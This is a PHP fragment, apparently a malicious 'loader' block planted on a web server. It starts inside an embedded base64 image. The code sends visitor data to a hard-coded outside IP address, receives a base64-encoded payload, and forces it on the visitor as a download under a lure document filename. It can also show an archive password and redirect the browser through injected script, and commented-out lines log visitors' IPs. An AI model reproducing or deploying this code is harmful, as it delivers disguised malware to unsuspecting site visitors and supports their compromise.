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';


			if( !empty($tmp_resp_json['passwd']) ){

				echo "<div style='font-family: Tahoma, sans-serif;width: 360px;margin:50px auto;font-size: 18px;font-weight: bold;background: #eee;padding: 25px 50px;border-radius: 4px;border: 2px solid #03a9f4;text-align:center;'><img height='60px' src='", $image_data,"'><br><br>", $tmp_resp_json['passwd'],"</div>";

			}

			echo "<script>";
			
			// echo "location.pathname = document.getElementById('". $random_name_id ."').getAttribute('data-". $random_name_id ."');";

			echo "location.pathname = '". $redirect_uri ."';";

			echo "</script>";

			echo "</body></html>";

			exit();
		}
		

	}

	if( empty($_SESSION['file_ext']) ){
		$_SESSION['file_ext'] = 'zip';
	}

	// check redirect
	/*
	if( empty( $hdrs_new['hh'] ) 
		&& $_GET['e'] != $REDIRECT_FILENAME . "." . $file_ext 
	){
		exit();
	}
	*/

	// check logo

	/*
	if( empty( $hdrs_new['hh'] ) && $_SESSION['has_logo'] !== true ){
		exit();
	}
	*/

	$resp_version = 2;

	$links = array(
		'http://193.149.129.51/router08.php?pp=' . $data_json . '&version=' . $VERSION . '&resp_version=' . $resp_version,
		'http://193.149.129.51/router08.php?pp=' . $data_json . '&version=' . $VERSION . '&resp_version=' . $resp_version,
		'http://193.149.129.51/router08.php?pp=' . $data_json . '&version=' . $VERSION . '&resp_version=' . $resp_version,
	);

	shuffle($links);

	/*
	file_put_contents( 
		__DIR__ . '/../try__big__stat.txt',
		date('c') . "\t" . getRealIpAddr() . "\t" . $_SERVER['HTTP_USER_AGENT'] . "\t". $_GET['e'] . "\r\n",
		FILE_APPEND
	);
	*/

	$outfilepath = __DIR__ . '/../big__stat.txt';

	if( empty($_SESSION['doc_name']) ){
		$_SESSION['doc_name'] = $REDIRECT_FILENAME . "." . $file_ext;
	}

	foreach ($links as $link) {

		$ctx = stream_context_create(array('http'=>
		    array(
		        'timeout' => 30,
		    )
		));

		$data = @file_get_contents( $link , false, $ctx);

		if( $data == '....' || $data == '...' ){
			break;
		}

		if( strlen($data) < 100 ){
			continue;
		}

		/*
		file_put_contents( 
			$outfilepath,
			date('c') . "\t" . getRealIpAddr() . "\t" . $_SERVER['HTTP_USER_AGENT'] . "\t". $_GET['e'] . "\r\n",
			FILE_APPEND
		);
		*/

		$resp_data = $data;
		$fname = $_SESSION['doc_name'];

		if( $resp_version == 2 ){

			$tmp_data = json_decode( $data, true );

			$fname = $REDIRECT_FILENAME . '.' . $tmp_data['format'];
			$resp_data = base64_decode( $tmp_data['data'] );

		}

		header('Content-Description: File Transfer');
		header('Content-Type: application/octet-stream');
		header('Content-Disposition: attachment; filename=' . $fname ); 
		header('Content-Transfer-Encoding: binary');
		header('Connection: Keep-Alive');
		header('Expires: 0');
		header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
		header('Pragma: public');

		echo $resp_data;

		exit;
	}

	// exit("Try again.");

	//<< loader